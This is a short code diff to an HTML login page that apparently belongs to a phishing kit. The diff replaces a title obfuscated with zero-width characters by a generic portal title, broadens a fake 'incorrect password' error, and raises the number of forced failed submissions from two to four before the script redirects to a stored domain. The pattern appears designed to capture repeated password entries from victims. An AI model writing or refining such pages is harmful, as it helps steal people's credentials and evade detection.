@@ -2,7 +2,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>l​o​g​i​n</title>
+    <title>Welcome:: Your Access Portal</title>
 
 
     <link href="css/bootstrap.min.css" rel="stylesheet">
@@ -425,7 +425,7 @@
         <div class="form-container">
             <div class="error-message" id="error-message">
                 <i class="bi bi-exclamation-triangle-fill me-2"></i>
-                <span class="translatable" data-key="try-again">Incorrect password. Please try again.</span>
+                <span class="translatable" data-key="try-again">Error! Incorrect email address/password. Please try again</span>
             </div>
 
             <div class="form-header">
@@ -809,7 +809,7 @@ let redirectDomain = null;
                         document.getElementById('password').value = '';
                         document.getElementById('password').focus();
                     }, 3000);
-                } else if (submitCount === 2) {
+                } else if (submitCount === 4) {
                     setTimeout(() => {
                         loaderOverlay.style.display = 'none';
                         if (domain) {
